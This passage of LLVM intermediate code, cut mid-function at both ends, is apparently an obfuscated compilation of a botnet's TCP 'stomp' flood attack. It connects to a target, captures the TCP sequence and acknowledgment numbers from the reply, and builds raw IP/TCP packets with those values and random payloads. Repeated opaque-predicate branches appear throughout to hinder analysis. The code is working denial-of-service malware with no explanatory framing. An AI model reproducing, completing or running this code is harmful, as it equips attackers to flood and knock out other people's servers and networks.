  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %137

; <label>:137:                                    ; preds = %663, %636, %originalBBpart2
  %138 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %138, i32* %26, align 4
  %139 = icmp eq i32 %138, -1
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  br label %668

; <label>:141:                                    ; preds = %137
  %142 = load i32, i32* @x.31
  %143 = load i32, i32* @y.32
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %141
  %150 = load i32, i32* %26, align 4
  %151 = load i32, i32* %26, align 4
  %152 = call i32 (i32, i32, ...) @fcntl(i32 %151, i32 3, i32 0)
  %153 = or i32 %152, 2048
  %154 = call i32 (i32, i32, ...) @fcntl(i32 %150, i32 4, i32 %153)
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %155, align 4
  %156 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 2
  %161 = load i8, i8* %160, align 4
  %162 = zext i8 %161 to i32
  %163 = icmp slt i32 %162, 32
  %164 = load i32, i32* @x.31
  %165 = load i32, i32* @y.32
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %163, label %172, label %209

; <label>:172:                                    ; preds = %originalBBpart24
  %173 = load i32, i32* @x.31
  %174 = load i32, i32* @y.32
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %172
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = call i32 @ntohl(i32 %186) #7
  %188 = call i32 @rand_next()
  %189 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 2
  %194 = load i8, i8* %193, align 4
  %195 = zext i8 %194 to i32
  %196 = lshr i32 %188, %195
  %197 = add i32 %187, %196
  %198 = call i32 @htonl(i32 %197) #7
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %200 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %199, i32 0, i32 0
  store i32 %198, i32* %200, align 4
  %201 = load i32, i32* @x.31
  %202 = load i32, i32* @y.32
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart223, label %originalBB6alteredBB

originalBBpart223:                                ; preds = %originalBB6
  br label %218

; <label>:209:                                    ; preds = %originalBBpart24
  %210 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %211 = load i32, i32* %9, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i32 0, i32 1
  %215 = load i32, i32* %214, align 4
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %217 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %216, i32 0, i32 0
  store i32 %215, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %209, %originalBBpart223
  %219 = load i16, i16* %17, align 2
  %220 = zext i16 %219 to i32
  %221 = icmp eq i32 %220, 65535
  br i1 %221, label %222, label %243

; <label>:222:                                    ; preds = %218
  %223 = load i32, i32* @x.31
  %224 = load i32, i32* @y.32
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %222
  %231 = call i32 @rand_next()
  %232 = and i32 %231, 65535
  %233 = trunc i32 %232 to i16
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %233, i16* %234, align 2
  %235 = load i32, i32* @x.31
  %236 = load i32, i32* @y.32
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart233, label %originalBB25alteredBB

originalBBpart233:                                ; preds = %originalBB25
  br label %247

; <label>:243:                                    ; preds = %218
  %244 = load i16, i16* %17, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %245, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %243, %originalBBpart233
  %248 = load i32, i32* %26, align 4
  %249 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %250 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %250, %struct.sockaddr** %249, align 8
  %251 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %252 = load %struct.sockaddr*, %struct.sockaddr** %251, align 8
  %253 = call i32 @connect(i32 %248, %struct.sockaddr* %252, i32 16)
  %254 = call i64 @time(i64* null) #6
  store i64 %254, i64* %31, align 8
  br label %255

; <label>:255:                                    ; preds = %666, %247
  store i32 16, i32* %29, align 4
  %256 = load i32, i32* %10, align 4
  %257 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %258 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %259 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %259, %struct.sockaddr** %258, align 8
  %260 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %261 = load %struct.sockaddr*, %struct.sockaddr** %260, align 8
  %262 = call i64 @recvfrom(i32 %256, i8* %257, i64 256, i32 16384, %struct.sockaddr* %261, i32* %29)
  %263 = trunc i64 %262 to i32
  store i32 %263, i32* %33, align 4
  %264 = load i32, i32* %33, align 4
  %265 = icmp eq i32 %264, -1
  br i1 %265, label %266, label %283

; <label>:266:                                    ; preds = %255
  %267 = load i32, i32* @x.31
  %268 = load i32, i32* @y.32
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %266
  %275 = load i32, i32* @x.31
  %276 = load i32, i32* @y.32
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %831

; <label>:283:                                    ; preds = %255
  %284 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %285 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 4
  %287 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %288 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 4
  %290 = icmp eq i32 %286, %289
  br i1 %290, label %291, label %642

; <label>:291:                                    ; preds = %283
  %292 = load i32, i32* %33, align 4
  %293 = sext i32 %292 to i64
  %294 = icmp ugt i64 %293, 40
  br i1 %294, label %295, label %642

; <label>:295:                                    ; preds = %291
  %296 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %297 = getelementptr inbounds i8, i8* %296, i64 20
  %298 = bitcast i8* %297 to %struct.tcphdr*
  store %struct.tcphdr* %298, %struct.tcphdr** %35, align 8
  %299 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 0
  %301 = load i16, i16* %300, align 4
  %302 = zext i16 %301 to i32
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %304 = load i16, i16* %303, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %302, %305
  br i1 %306, label %307, label %641

; <label>:307:                                    ; preds = %295
  %308 = load i32, i32* @x.31
  %309 = load i32, i32* @y.32
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %307
  %316 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = lshr i16 %318, 9
  %320 = and i16 %319, 1
  %321 = zext i16 %320 to i32
  %322 = icmp ne i32 %321, 0
  %323 = load i32, i32* @x.31
  %324 = load i32, i32* @y.32
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart254, label %originalBB39alteredBB

originalBBpart254:                                ; preds = %originalBB39
  br i1 %322, label %331, label %604

; <label>:331:                                    ; preds = %originalBBpart254
  %332 = load i32, i32* @x.31
  %333 = load i32, i32* @y.32
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %331
  %340 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = lshr i16 %342, 12
  %344 = and i16 %343, 1
  %345 = zext i16 %344 to i32
  %346 = icmp ne i32 %345, 0
  %347 = load i32, i32* @x.31
  %348 = load i32, i32* @y.32
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart274, label %originalBB56alteredBB

originalBBpart274:                                ; preds = %originalBB56
  br i1 %346, label %355, label %604

; <label>:355:                                    ; preds = %originalBBpart274
  %356 = load i32, i32* @x.31
  %357 = load i32, i32* @y.32
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %355
  %364 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %365 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %364, i32 0, i32 0
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %370, i32 0, i32 0
  store i32 %366, i32* %371, align 4
  %372 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 2
  %374 = load i32, i32* %373, align 4
  %375 = call i32 @ntohl(i32 %374) #7
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 1
  store i32 %375, i32* %380, align 4
  %381 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %382 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %381, i32 0, i32 3
  %383 = load i32, i32* %382, align 4
  %384 = call i32 @ntohl(i32 %383) #7
  %385 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %386 = load i32, i32* %9, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %385, i64 %387
  %389 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %388, i32 0, i32 2
  store i32 %384, i32* %389, align 4
  %390 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i32 0, i32 1
  %392 = load i16, i16* %391, align 2
  %393 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %394 = load i32, i32* %9, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %396, i32 0, i32 3
  store i16 %392, i16* %397, align 4
  %398 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %399 = load i16, i16* %398, align 2
  %400 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %401 = load i32, i32* %9, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %400, i64 %402
  %404 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %403, i32 0, i32 4
  store i16 %399, i16* %404, align 2
  %405 = load i32, i32* %24, align 4
  %406 = sext i32 %405 to i64
  %407 = add i64 40, %406
  %408 = call noalias i8* @malloc(i64 %407) #6
  %409 = load i8**, i8*** %12, align 8
  %410 = load i32, i32* %9, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds i8*, i8** %409, i64 %411
  store i8* %408, i8** %412, align 8
  %413 = load i8**, i8*** %12, align 8
  %414 = load i32, i32* %9, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds i8*, i8** %413, i64 %415
  %417 = load i8*, i8** %416, align 8
  %418 = bitcast i8* %417 to %struct.iphdr*
  store %struct.iphdr* %418, %struct.iphdr** %36, align 8
  %419 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i64 1
  %421 = bitcast %struct.iphdr* %420 to %struct.tcphdr*
  store %struct.tcphdr* %421, %struct.tcphdr** %37, align 8
  %422 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i64 1
  %424 = bitcast %struct.tcphdr* %423 to i8*
  store i8* %424, i8** %38, align 8
  %425 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %426 = bitcast %struct.iphdr* %425 to i8*
  %427 = load i8, i8* %426, align 4
  %428 = and i8 %427, 15
  %429 = or i8 %428, 64
  store i8 %429, i8* %426, align 4
  %430 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %431 = bitcast %struct.iphdr* %430 to i8*
  %432 = load i8, i8* %431, align 4
  %433 = and i8 %432, -16
  %434 = or i8 %433, 5
  store i8 %434, i8* %431, align 4
  %435 = load i8, i8* %13, align 1
  %436 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 1
  store i8 %435, i8* %437, align 1
  %438 = load i32, i32* %24, align 4
  %439 = sext i32 %438 to i64
  %440 = add i64 40, %439
  %441 = trunc i64 %440 to i16
  %442 = call zeroext i16 @htons(i16 zeroext %441) #7
  %443 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 2
  store i16 %442, i16* %444, align 2
  %445 = load i16, i16* %14, align 2
  %446 = call zeroext i16 @htons(i16 zeroext %445) #7
  %447 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 3
  store i16 %446, i16* %448, align 4
  %449 = load i8, i8* %15, align 1
  %450 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %450, i32 0, i32 5
  store i8 %449, i8* %451, align 4
  %452 = load i8, i8* %16, align 1
  %453 = icmp ne i8 %452, 0
  %454 = load i32, i32* @x.31
  %455 = load i32, i32* @y.32
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart2121, label %originalBB76alteredBB

originalBBpart2121:                               ; preds = %originalBB76
  br i1 %453, label %462, label %482

; <label>:462:                                    ; preds = %originalBBpart2121
  %463 = load i32, i32* @x.31
  %464 = load i32, i32* @y.32
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %462
  %471 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %472 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 4
  store i16 %471, i16* %473, align 2
  %474 = load i32, i32* @x.31
  %475 = load i32, i32* @y.32
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br label %482

; <label>:482:                                    ; preds = %originalBBpart2125, %originalBBpart2121
  %483 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 6
  store i8 6, i8* %484, align 1
  %485 = load i32, i32* @LOCAL_ADDR, align 4
  %486 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 8
  store i32 %485, i32* %487, align 4
  %488 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %491, i32 0, i32 0
  %493 = load i32, i32* %492, align 4
  %494 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 9
  store i32 %493, i32* %495, align 4
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 3
  %501 = load i16, i16* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 0
  store i16 %501, i16* %503, align 4
  %504 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %505 = load i32, i32* %9, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %507, i32 0, i32 4
  %509 = load i16, i16* %508, align 2
  %510 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 1
  store i16 %509, i16* %511, align 2
  %512 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %513 = load i32, i32* %9, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %515, i32 0, i32 2
  %517 = load i32, i32* %516, align 4
  %518 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 2
  store i32 %517, i32* %519, align 4
  %520 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %523, i32 0, i32 1
  %525 = load i32, i32* %524, align 4
  %526 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 3
  store i32 %525, i32* %527, align 4
  %528 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 4
  %530 = load i16, i16* %529, align 4
  %531 = and i16 %530, -241
  %532 = or i16 %531, 128
  store i16 %532, i16* %529, align 4
  %533 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %534 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %533, i32 0, i32 4
  %535 = load i16, i16* %534, align 4
  %536 = and i16 %535, -257
  %537 = or i16 %536, 256
  store i16 %537, i16* %534, align 4
  %538 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 4
  %540 = load i16, i16* %539, align 4
  %541 = and i16 %540, -4097
  %542 = or i16 %541, 4096
  store i16 %542, i16* %539, align 4
  %543 = call i32 @rand_next()
  %544 = and i32 %543, 65535
  %545 = trunc i32 %544 to i16
  %546 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 5
  store i16 %545, i16* %547, align 2
  %548 = load i8, i8* %18, align 1
  %549 = sext i8 %548 to i16
  %550 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %551 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %550, i32 0, i32 4
  %552 = load i16, i16* %551, align 4
  %553 = and i16 %549, 1
  %554 = shl i16 %553, 13
  %555 = and i16 %552, -8193
  %556 = or i16 %555, %554
  store i16 %556, i16* %551, align 4
  %557 = load i8, i8* %19, align 1
  %558 = sext i8 %557 to i16
  %559 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 4
  %561 = load i16, i16* %560, align 4
  %562 = and i16 %558, 1
  %563 = shl i16 %562, 12
  %564 = and i16 %561, -4097
  %565 = or i16 %564, %563
  store i16 %565, i16* %560, align 4
  %566 = load i8, i8* %20, align 1
  %567 = sext i8 %566 to i16
  %568 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 4
  %570 = load i16, i16* %569, align 4
  %571 = and i16 %567, 1
  %572 = shl i16 %571, 11
  %573 = and i16 %570, -2049
  %574 = or i16 %573, %572
  store i16 %574, i16* %569, align 4
  %575 = load i8, i8* %21, align 1
  %576 = sext i8 %575 to i16
  %577 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 4
  %579 = load i16, i16* %578, align 4
  %580 = and i16 %576, 1
  %581 = shl i16 %580, 10
  %582 = and i16 %579, -1025
  %583 = or i16 %582, %581
  store i16 %583, i16* %578, align 4
  %584 = load i8, i8* %22, align 1
  %585 = sext i8 %584 to i16
  %586 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 4
  %588 = load i16, i16* %587, align 4
  %589 = and i16 %585, 1
  %590 = shl i16 %589, 9
  %591 = and i16 %588, -513
  %592 = or i16 %591, %590
  store i16 %592, i16* %587, align 4
  %593 = load i8, i8* %23, align 1
  %594 = sext i8 %593 to i16
  %595 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 4
  %597 = load i16, i16* %596, align 4
  %598 = and i16 %594, 1
  %599 = shl i16 %598, 8
  %600 = and i16 %597, -257
  %601 = or i16 %600, %599
  store i16 %601, i16* %596, align 4
  %602 = load i8*, i8** %38, align 8
  %603 = load i32, i32* %24, align 4
  call void @rand_str(i8* %602, i32 %603)
  br label %667

; <label>:604:                                    ; preds = %originalBBpart274, %originalBBpart254
  %605 = load i32, i32* @x.31
  %606 = load i32, i32* @y.32
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %604
  %613 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 4
  %615 = load i16, i16* %614, align 4
  %616 = lshr i16 %615, 8
  %617 = and i16 %616, 1
  %618 = zext i16 %617 to i32
  %619 = icmp ne i32 %618, 0
  %620 = load i32, i32* @x.31
  %621 = load i32, i32* @y.32
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBBpart2139, label %originalBB127alteredBB

originalBBpart2139:                               ; preds = %originalBB127
  br i1 %619, label %636, label %628

; <label>:628:                                    ; preds = %originalBBpart2139
  %629 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %630 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %629, i32 0, i32 4
  %631 = load i16, i16* %630, align 4
  %632 = lshr i16 %631, 10
  %633 = and i16 %632, 1
  %634 = zext i16 %633 to i32
  %635 = icmp ne i32 %634, 0
  br i1 %635, label %636, label %639

; <label>:636:                                    ; preds = %628, %originalBBpart2139
  %637 = load i32, i32* %26, align 4
  %638 = call i32 @close(i32 %637)
  br label %137

; <label>:639:                                    ; preds = %628
  br label %640

; <label>:640:                                    ; preds = %639
  br label %641

; <label>:641:                                    ; preds = %640, %295
  br label %642

; <label>:642:                                    ; preds = %641, %291, %283
  %643 = load i32, i32* @x.31
  %644 = load i32, i32* @y.32
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
